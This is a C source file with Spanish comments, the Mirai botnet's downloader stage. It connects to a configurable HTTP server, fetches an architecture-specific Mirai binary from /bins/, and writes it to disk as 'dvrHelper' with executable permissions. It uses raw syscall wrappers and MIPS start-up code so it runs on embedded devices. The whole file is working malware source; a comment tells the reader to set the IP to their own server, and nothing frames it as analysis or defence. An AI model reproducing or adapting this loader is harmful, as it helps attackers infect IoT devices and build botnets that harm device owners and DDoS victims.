/**************************************************************************
 * Archivo: main.c
 * Descripción: Este es un cargador (downloader) que descarga y ejecuta binarios
 * para el malware Mirai. Se comunica con un servidor HTTP para obtener el binario
 * específico para la arquitectura del sistema objetivo.
 **************************************************************************/

#include <sys/types.h>
//#include <bits/syscalls.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>

// Define la dirección IP del servidor HTTP desde donde se descargará el malware
#define HTTP_SERVER utils_inet_addr(127,0,0,1) // Cambiar a la IP de tu servidor HTTP

// Mensaje enviado cuando el programa inicia su ejecución
#define EXEC_MSG            "MIRAI\n"
#define EXEC_MSG_LEN        6

// Mensaje enviado cuando la descarga se completa
#define DOWNLOAD_MSG        "FIN\n"
#define DOWNLOAD_MSG_LEN    4

// Descriptores de archivo estándar
#define STDIN   0   // Entrada estándar
#define STDOUT  1   // Salida estándar
#define STDERR  2   // Salida de error estándar

// Macros para la conversión de bytes entre el orden de red y el orden del host
#if BYTE_ORDER == BIG_ENDIAN
// En sistemas big-endian, no se necesita conversión
#define HTONS(n) (n)    // Host to Network Short
#define HTONL(n) (n)    // Host to Network Long
#elif BYTE_ORDER == LITTLE_ENDIAN
// En sistemas little-endian, se necesita invertir el orden de los bytes
#define HTONS(n) (((((unsigned short)(n) & 0xff)) << 8) | (((unsigned short)(n) & 0xff00) >> 8))
#define HTONL(n) (((((unsigned long)(n) & 0xff)) << 24) | \
                  ((((unsigned long)(n) & 0xff00)) << 8) | \
                  ((((unsigned long)(n) & 0xff0000)) >> 8) | \
                  ((((unsigned long)(n) & 0xff000000)) >> 24))
#else
#error "Corregir el orden de bytes"
#endif

// Macro para el manejo de números de llamadas al sistema en ARM EABI
#ifdef __ARM_EABI__
#define SCN(n) ((n) & 0xfffff)    // Máscara para extraer el número de syscall en ARM
#else
#define SCN(n) (n)                // En otras arquitecturas, no se requiere máscara
#endif

// Declaraciones de funciones
inline void run(void);                    // Función principal que maneja la descarga
int sstrlen(char *);                      // Implementación personalizada de strlen
unsigned int utils_inet_addr(unsigned char, unsigned char, unsigned char, unsigned char);  // Convierte IPv4 a formato numérico

/* Implementaciones personalizadas de llamadas estándar de sistema */
int xsocket(int, int, int);
int xwrite(int, void *, int);
int xread(int, void *, int);
int xconnect(int, struct sockaddr_in *, int);
int xopen(char *, int, int);
int xclose(int);
void x__exit(int);

#define socket xsocket
#define write xwrite
#define read xread
#define connect xconnect
#define open xopen
#define close xclose
#define __exit x__exit

#ifdef DEBUG
/*
void xprintf(char *str)
{
    write(1, str, sstrlen(str));
}
#define printf xprintf
*/
#endif

// Punto de entrada del programa
void __start(void)
{ 
#if defined(MIPS) || defined(MIPSEL)
    // Código de ensamblador específico para arquitecturas MIPS
    // Configura el registro de retorno y el puntero global
    __asm(
        ".set noreorder\n"        // Desactiva la reordenación de instrucciones
        "move $0, $31\n"          // Guarda el registro de retorno
        "bal 10f\n"               // Rama y enlace a la etiqueta local
        "nop\n"                   // Ranura de retardo
        "10:\n.cpload $31\n"      // Carga la tabla de punteros constantes
        "move $31, $0\n"          // Restaura el registro de retorno
        ".set reorder\n"          // Reactiva la reordenación de instrucciones
    );
#endif
    run();  // Inicia la ejecución principal del programa
}

// Función principal que maneja la descarga y ejecución del malware
inline void run(void)
{
    char recvbuf[128];                // Buffer para recibir datos del servidor
    struct sockaddr_in addr;          // Estructura para la dirección del servidor
    int sfd, ffd, ret;               // Descriptores de archivo y variable de retorno
    unsigned int header_parser = 0;   // Parser para el encabezado HTTP
    int arch_strlen = sstrlen(BOT_ARCH);

    write(STDOUT, EXEC_MSG, EXEC_MSG_LEN);

    addr.sin_family = AF_INET;
    addr.sin_port = HTONS(80);
    addr.sin_addr.s_addr = HTTP_SERVER;

    ffd = open("dvrHelper", O_WRONLY | O_CREAT | O_TRUNC, 0777);

    sfd = socket(AF_INET, SOCK_STREAM, 0);

#ifdef DEBUG
    if (ffd == -1)
        printf("Failed to open file!\n");
    if (sfd == -1)
        printf("Failed to call socket()\n");
#endif

    if (sfd == -1 || ffd == -1)
        __exit(1);

#ifdef DEBUG
    printf("Connecting to host...\n");
#endif

    if ((ret = connect(sfd, &addr, sizeof (struct sockaddr_in))) < 0)
    {
#ifdef DEBUG
        printf("Failed to connect to host.\n");
#endif
        write(STDOUT, "NIF\n", 4);
        __exit(-ret);
    }

#ifdef DEBUG
    printf("Connected to host\n");
#endif

    if (write(sfd, "GET /bins/mirai." BOT_ARCH " HTTP/1.0\r\n\r\n", 16 + arch_strlen + 13) != (16 + arch_strlen + 13))
    {
#ifdef DEBUG
        printf("Failed to send get request.\n");
#endif

        __exit(3);
    }

#ifdef DEBUG
    printf("Started header parse...\n");
#endif

    while (header_parser != 0x0d0a0d0a)
    {
        char ch;
        int ret = read(sfd, &ch, 1);

        if (ret != 1)
            __exit(4);
        header_parser = (header_parser << 8) | ch;
    }

#ifdef DEBUG
    printf("Finished receiving HTTP header\n");
#endif

    while (1)
    {
        int ret = read(sfd, recvbuf, sizeof (recvbuf));

        if (ret <= 0)
            break;
        write(ffd, recvbuf, ret);
    }

    close(sfd);
    close(ffd);
    write(STDOUT, DOWNLOAD_MSG, DOWNLOAD_MSG_LEN);
    __exit(5);
}

// Implementación personalizada de strlen para evitar dependencias de libc
int sstrlen(char *str)
{
    int c = 0;

    while (*str++ != 0)  // Cuenta caracteres hasta encontrar el terminador nulo
        c++;
    return c;
}

// Convierte cuatro octetos de una dirección IPv4 a su representación numérica en orden de red
unsigned int utils_inet_addr(unsigned char one, unsigned char two, unsigned char three, unsigned char four)
{
    unsigned long ip = 0;

    // Combina los octetos usando operaciones de bits
    ip |= (one << 24);    // Primer octeto en los bits más significativos
    ip |= (two << 16);    // Segundo octeto
    ip |= (three << 8);   // Tercer octeto
    ip |= (four << 0);    // Cuarto octeto en los bits menos significativos
    return HTONL(ip);     // Convierte al orden de bytes de red
}

// Implementación personalizada de la llamada al sistema socket
int xsocket(int domain, int type, int protocol)
{
#if defined(__NR_socketcall)
    // En algunos sistemas, todas las operaciones de socket se manejan a través de socketcall
#ifdef DEBUG
    printf("socket usando socketcall\n");
#endif
    // Estructura para pasar argumentos a socketcall
    struct {
        int domain, type, protocol;
    } socketcall;
    socketcall.domain = domain;      // Familia de protocolos (AF_INET, etc.)
    socketcall.type = type;          // Tipo de socket (SOCK_STREAM, etc.)
    socketcall.protocol = protocol;   // Protocolo específico

    // Llama a socketcall con SYS_SOCKET (1) como primera operación
    int ret = syscall(SCN(SYS_socketcall), 1, &socketcall);

#ifdef DEBUG
    printf("socket got ret: %d\n", ret);
#endif
     return ret;
#else
#ifdef DEBUG
    printf("socket using socket\n");
#endif
    return syscall(SCN(SYS_socket), domain, type, protocol);
#endif
}

int xread(int fd, void *buf, int len)
{
    return syscall(SCN(SYS_read), fd, buf, len);
}

int xwrite(int fd, void *buf, int len)
{
    return syscall(SCN(SYS_write), fd, buf, len);
}

// Implementación personalizada de la llamada al sistema connect
int xconnect(int fd, struct sockaddr_in *addr, int len)
{
#if defined(__NR_socketcall)
    // En sistemas que usan socketcall para operaciones de red
#ifdef DEBUG
    printf("connect usando socketcall\n");
#endif
    // Estructura para pasar argumentos a la llamada socketcall
    struct {
        int fd;                    // Descriptor del socket
        struct sockaddr_in *addr;  // Dirección del servidor
        int len;                   // Longitud de la estructura de dirección
    } socketcall;
    socketcall.fd = fd;
    socketcall.addr = addr;
    socketcall.len = len;
    // Llama a socketcall con SYS_CONNECT (3) como operación
    int ret = syscall(SCN(SYS_socketcall), 3, &socketcall);

#ifdef DEBUG
    printf("connect got ret: %d\n", ret);
#endif

    return ret;
#else
#ifdef DEBUG
    printf("connect using connect\n");
#endif
    return syscall(SCN(SYS_connect), fd, addr, len);
#endif
}

int xopen(char *path, int flags, int other)
{
    return syscall(SCN(SYS_open), path, flags, other);
}

int xclose(int fd)
{
    return syscall(SCN(SYS_close), fd);
}

void x__exit(int code)
{
    syscall(SCN(SYS_exit), code);
}
